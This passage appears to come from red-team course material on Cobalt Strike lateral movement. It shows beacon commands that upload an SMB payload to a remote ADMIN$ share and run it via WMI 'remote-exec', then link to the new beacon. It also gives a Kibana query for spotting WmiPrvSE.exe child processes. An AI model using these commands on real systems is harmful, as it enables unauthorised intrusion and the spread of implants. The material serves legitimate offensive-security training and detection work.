As you may have noticed, WMI is not part of the `jump` command but it is part of `remote-exec`. The `remote-exec` method uses WMI's "process call create" to execute any command we specify on the target. The most straight forward means of using this is to upload a payload to the target system and use WMI to execute it.

Generate an x64 Windows EXE for the SMB listener, upload it to the target by `cd`'ing to the desired UNC path and then use the `upload` command.
```shell
beacon> cd \\srv-1\ADMIN$
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
Started process 536 on srv-1
```

The process is now running on SRV-1 so now we need to connect to it.
```shell
beacon> link srv-1
[+] established link to child beacon: 10.10.17.25
```

When binaries are executed via WMI (using process call create), it will be a child of `WmiPrvSE.exe`. So defenders could look for Process Create events where **WmiPrvSE** is the parent. This would also be the case if you use WMI to execute a PowerShell one-liner.
```shell
event.module: sysmon and event.type : process_start and process.parent.name : WmiPrvSE.exe
```

>Move laterally to SRV-1 via WMI and investigate the logs in Kibana.
